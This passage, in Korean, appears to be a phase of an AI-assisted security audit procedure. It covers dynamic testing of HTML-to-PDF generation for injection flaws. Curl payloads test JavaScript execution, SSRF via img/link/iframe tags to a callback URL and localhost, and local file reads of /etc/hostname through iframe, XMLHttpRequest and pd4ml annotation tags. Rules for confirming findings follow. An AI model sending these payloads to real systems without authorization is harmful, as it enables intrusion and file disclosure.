### Phase 2: 동적 테스트 (검증)

Phase 1 소스코드 분석이 완료되면 후보 목록을 사용자에게 보여준다. 후보가 존재하는 경우에만 동적 테스트를 진행한다. 후보가 0건이면 동적 테스트 없이 바로 보고서를 작성한다.

**동적 테스트 정보 획득:**

사용자에게는 테스트 대상 도메인(Host)과 직접 획득이 불가능한 정보(외부 콜백 서비스 URL, 프로덕션 전용 자격 증명 등)만 요청한다. 그 외의 정보는 소스코드 분석 또는 관련 엔드포인트에 직접 HTTP 요청을 보내 획득한다.

사용자가 동적 테스트를 원하지 않거나 정보를 제공하지 않으면, 소스코드 분석 결과의 모든 후보를 "후보"로 유지한 채 Phase 3으로 진행한다.

**JavaScript 실행 테스트:**
```
# document.write로 JavaScript 실행 확인
curl -X POST "https://target.com/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d '{"content":"<script>document.write(\"JS_EXECUTED\")</script>"}'

# 서버 환경 정보 노출
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<script>document.write(window.location)</script>"}'
```

**SSRF 테스트 (외부 콜백):**
```
# img 태그로 외부 요청
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<img src=\"http://CALLBACK_URL/ssrf-pdf\">"}'

# link 태그
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<link rel=\"stylesheet\" href=\"http://CALLBACK_URL/ssrf-css\">"}'

# iframe으로 내부 서비스 응답 포함
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<iframe src=\"http://127.0.0.1:8080/\" width=\"800\" height=\"500\"></iframe>"}'
```

**LFI 테스트:**
```
# iframe으로 로컬 파일
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<iframe src=\"file:///etc/hostname\" width=\"800\" height=\"500\"></iframe>"}'

# XMLHttpRequest로 파일 읽기
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<script>x=new XMLHttpRequest();x.onload=function(){document.write(this.responseText)};x.open(\"GET\",\"file:///etc/hostname\");x.send();</script>"}'

# annotation 태그 (pd4ml 등)
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<annotation file=\"/etc/hostname\" content=\"/etc/hostname\" icon=\"Graph\" title=\"test\"/>"}'
```

**검증 방법:**
- 생성된 PDF를 다운로드하여 내용 확인
- PDF에 `JS_EXECUTED`, 파일 내용(`root:x:0:0:`), 내부 서비스 응답이 포함되어 있는지 확인
- 외부 콜백 서비스에서 서버로부터의 요청 수신 확인

**검증 기준:**
- **확인됨**: 동적 테스트로 PDF에 로컬 파일 내용이 포함되거나, SSRF로 외부 콜백 수신이 확인되거나, JavaScript 실행이 확인됨
- **후보**: 동적 테스트를 수행하지 않았거나, 동적 테스트로 확인이 불가하여 수동 확인이 필요한 경우
- **"확인됨"은 동적 테스트를 통해서만 부여할 수 있다**: 소스코드 분석만으로는 아무리 취약해 보여도 "확인됨"으로 보고하지 않는다. 동적 테스트로 실제 트리거를 확인한 경우에만 "확인됨"이다. 동적 테스트를 수행하지 않았으면 모든 결과는 "후보"이다.
- **보고서 제외**: 동적 테스트 결과 취약하지 않은 것으로 확인된 경우는 보고서에 포함하지 않는다
